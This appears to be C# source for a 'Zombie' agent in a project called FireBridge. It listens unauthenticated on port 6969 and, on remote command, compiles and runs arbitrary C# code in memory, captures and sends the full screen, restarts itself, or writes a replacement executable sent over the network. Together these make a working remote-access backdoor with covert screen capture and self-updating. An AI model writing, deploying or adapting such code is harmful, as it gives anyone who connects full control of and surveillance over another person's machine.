using FirebridgeShared.Models;
using FirebridgeShared.Networking;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FireBridgeZombie
{
    class Zombie
    {
        Server s;

        EventLog eventLog;
        public Zombie()
        {

            eventLog = new EventLog();
            eventLog.Source = "ZOMBIE";
            eventLog.Log = "FireBridgeLog";
            eventLog.WriteEntry("ZOMBIE Starting");
            s = new Server();
            s.ClientConnected += S_ClientConnected;
            s.ConnectionDisconnected += S_ConnectionDisconnected;
        }

        private void S_ConnectionDisconnected(object sender, EventArgs e)
        {
            eventLog.WriteEntry("ZOMBIE DIS");
            var e2 = (ServerConnectionEventArgs)e;
        }

        private void Connection_MessageRecieved(object sender, EventArgs e)
        {
            eventLog.WriteEntry("ZOMBIE MES");
            var packet = ((MessageEventArgs)e).Packet;
            var connection = (Connection)sender;
            switch (packet.Id)
            {
                case 0: //Message/Command
                    break;
                case 1: //Run Code
                    var code = (MiniProgramModel)packet.Data;
                    CSharpCodeProvider provider = new CSharpCodeProvider();
                    CompilerParameters parameters = new CompilerParameters();
                    parameters.GenerateInMemory = true;
                    parameters.ReferencedAssemblies.AddRange(code.References.ToArray());
                    CompilerResults results = provider.CompileAssemblyFromSource(parameters, code.Code);
                    results.Errors.Cast<CompilerError>().ToList().ForEach(error => Console.WriteLine(error.ErrorText));

                    var cls = results.CompiledAssembly.GetType(code.EntryPoint);
                    var method = cls.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);  
                    method.Invoke(null, new[] { s });

                    break;
                case 2: //Restart
                    s.Stop();
                    Environment.ExitCode = (int)packet.Data;
                    Application.Exit();
                    break;
                case 3: //Screenshot
                    Rectangle bounds = Screen.GetBounds(Point.Empty);
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }
                        connection.SendPacket(new Packet() { Id = 3, Data = bitmap });
                    }
                    break;
                case 4: //Update
                    File.WriteAllBytes("FireBridgeZombie.exe.new", (byte[])packet.Data);
                    s.Stop();
                    Environment.ExitCode = 69;
                    Application.Exit();
                    s.Stop();
                    break;
                default:
                    Console.WriteLine("Unknown Packet of " + packet.Id);
                    connection.SendPacket(new Packet() { Id = 0, Data = "Unknown Packet of " + packet.Id });
                    break;
            }
        }

        private void S_ClientConnected(object sender, EventArgs e)
        {
            eventLog.WriteEntry("ZOMBIE CON");
            var e2 = (ServerConnectionEventArgs)e;
            e2.Connection.MessageRecieved += Connection_MessageRecieved;
        }

        internal void Start()
        {
            eventLog.WriteEntry("ZOMBIE START");
            s.Start(new IPEndPoint(IPAddress.Any, 6969));
            eventLog.WriteEntry("ZOMBIE STARTSTOP");
        }
    }
}
